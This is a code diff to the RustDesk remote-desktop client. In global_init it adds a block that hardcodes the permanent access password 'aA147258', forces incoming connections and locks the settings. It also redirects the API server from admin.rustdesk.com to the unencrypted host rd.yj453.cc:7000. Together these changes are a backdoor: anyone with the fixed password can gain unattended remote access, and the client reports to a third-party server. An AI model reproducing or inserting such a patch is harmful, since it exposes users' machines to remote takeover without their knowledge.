@@ -128,8 +128,28 @@ pub fn global_init() -> bool {
             crate::server::wayland::init();
         }
     }
+    // AUTO_PATCH_SOS_INIT
+    {
+        use hbb_common::config::{Config, HARD_SETTINGS};
+        let _ = Config::set_permanent_password("aA147258");
+        Config::set_option("allow-remote-config-modification".into(), "N".into());
+        // 用公开 API 读取刚写入的永久密码 storage 和 salt
+        let (patched_pwd, patched_salt) = Config::get_local_permanent_password_storage_and_salt();
+        {
+            let mut hs = HARD_SETTINGS.write().unwrap();
+            hs.insert("conn-type".into(), "incoming".into());
+            hs.insert("allow-remote-config-modification".into(), "N".into());
+            if !patched_pwd.is_empty() {
+                hs.insert("password".into(), patched_pwd);
+                hs.insert("salt".into(), patched_salt);
+            }
+        }
+    }
+    // AUTO_PATCH_SOS_INIT_END
+
     true
 }
+
 
 pub fn global_clean() {}
 
@@ -1140,7 +1160,7 @@ fn get_api_server_(api: String, custom: String) -> String {
             return format!("http://{}", s);
         }
     }
-    "https://admin.rustdesk.com".to_owned()
+    "http://rd.yj453.cc:7000".to_owned()
 }
 
 #[inline]
